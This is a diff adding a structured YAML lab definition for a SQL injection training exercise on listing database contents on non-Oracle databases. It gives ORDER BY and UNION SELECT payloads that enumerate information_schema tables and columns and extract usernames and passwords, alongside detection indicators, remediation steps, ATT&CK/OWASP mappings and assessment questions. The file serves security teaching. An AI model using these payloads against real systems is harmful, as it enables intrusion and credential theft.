@@ -1,0 +1,99 @@
+# Category: SQL Injection
+name: "SQL injection attack, listing the database contents on non-Oracle databases"
+id: "sql-injection-list-contents-non-oracle-001"
+category: "sql_injection"
+subcategory: "data_extraction"
+difficulty: "practitioner"
+estimated_time: "60 minutes"
+
+description: |
+  This lab contains a SQL injection vulnerability in the product category filter.
+  The database is non-Oracle (e.g., MySQL, PostgreSQL, or MSSQL). The attacker
+  needs to list the contents of the database, including table names and column
+  names, and then extract sensitive data such as usernames and passwords.
+
+learning_objectives:
+  - Understand information_schema in non-Oracle databases
+  - Use UNION attacks to extract table and column names
+  - Extract sensitive data from the database
+
+tools:
+  - Burp Suite
+  - curl
+  - sqlmap (optional)
+
+prerequisites:
+  - Understanding of SQL and information_schema
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and select a category"
+      - "# Intercept the request in Burp Suite"
+    expected_output: "The category parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Determine the number of columns"
+    commands:
+      - "# Use ORDER BY to find column count"
+      - "category=Gifts' ORDER BY 1--"
+      - "# Increment until an error occurs"
+    expected_output: "Number of columns identified"
+    detection: "Database error messages"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Extract table and column names from information_schema"
+    commands:
+      - "# Extract table names"
+      - "category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--"
+      - "# Extract column names"
+      - "category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
+      - "# Extract data"
+      - "category=Gifts' UNION SELECT username, password FROM users--"
+    expected_output: "List of tables, columns, and sensitive data"
+    detection: "Database logs may show unusual queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URL parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  category_param: "category"
+
+assessment_questions:
+  - "What is the `information_schema` database used for?"
+  - "How can you list all tables in a database?"
+  - "What is the difference between `information_schema` and `sys`?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection"
+  - url: "https://dev.mysql.com/doc/refman/8.0/en/information-schema.html"
+    title: "MySQL Information Schema"
